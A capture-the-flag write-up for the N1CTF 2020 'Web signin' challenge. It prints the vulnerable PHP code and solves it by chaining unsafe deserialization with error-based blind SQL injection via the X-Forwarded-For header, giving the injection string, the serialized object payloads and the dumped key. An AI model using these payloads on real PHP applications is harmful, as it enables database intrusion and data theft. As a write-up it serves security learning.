# Web signin

## Description

It was php serialization challenge, ended up having 78 solves.

## Challenge

```
class ip {
    public $ip;
    public function waf($info){
    }
    public function __construct() {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this->ip = $this->waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this->ip =$_SERVER["REMOTE_ADDR"];
        }
    }
    public function __toString(){
        $con=mysqli_connect("localhost","root","********","n1ctf_websign");
        $sqlquery=sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return "your ip looks ok!";
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
    }
    public function getflag(){
    	if(md5($this->check)===md5("key****************")){
    		readfile('/flag');
    	}
        return $this->ip;
    }
    public function __wakeup(){
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo $this->getflag();
    }

}
if(isset($_GET['input'])){
    $input = $_GET['input'];
	unserialize($input);
} 
```
## Solution

To solve this, we just have to reach `getflag` method with correct check property.

```
 public function getflag(){
    if(md5($this->check)===md5("key")){
    	readfile('/flag');
    }
    return $this->ip;
}
```
`waf` method's code is not in picture.

Also there is a mysql connection in `__toString` method of `ip` class. So maybe the correct key is there.

To dump the key, we have to somehow get sql injection.

Basically there is injection point in code:

```
$sqlquery=sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
```
Also this part of code is interesting.

```
if(!mysqli_query($con,$sqlquery)){
     return mysqli_error($con);
}else{
     return "your ip looks ok!";
}
```
This code returns mysql error or a `your ip looks ok!` based on the query result. 

The other interesting part is 

```
public function __wakeup(){
    if(stristr($this->ip, "n1ctf")!==False)
        $this->ip = "welcome to n1ctf2020";
    else
        $this->ip = "noip";
}
``` 

This means if our ip has `n1ctf` in it, then `welcome to n1ctf2020` is shown, otherwise `noip`.

So if we can put `n1ctf` in mysql error code, we have sql injection.

This injection does the job.

```
'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=2 limit 1)))))&&'
```

The query with our injection would return error with `n1ctf` in it if `1=1` and `null` otherwise.
 
## Exploit

We can generate our serialized object with this code.

```
$payload = new flag("A");
$payload->ip = new ip();
echo urlencode(urlencode( $input ));
```

Which is 

```
O%3A4%3A%22flag%22%3A2%3A%7Bs%3A2%3A%22ip%22%3BO%3A2%3A%22ip%22%3A1%3A%7Bs%3A2%3A%22ip%22%3BN%3B%7Ds%3A5%3A%22check%22%3BN%3B%7DA
```

Then in `X-Forwarded-For` header

```
'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
```

The response contains `welcome to n1ctf2020` if `1=1` and `noip` otherwise.

Then you can get key with dumping database, which is `n1ctf20205bf75ab0a30dfc0c`.

Final payload is

```
O%3A4%3A"flag"%3A2%3A%7Bs%3A2%3A"ip"%3Bs%3A1%3A"A"%3Bs%3A5%3A"check"%3Bs%3A25%3A"n1ctf20205bf75ab0a30dfc0c"%3B%7DA
```

And the flag is <b>n1ctf{you_g0t_1t_hack_for_fun}</b>

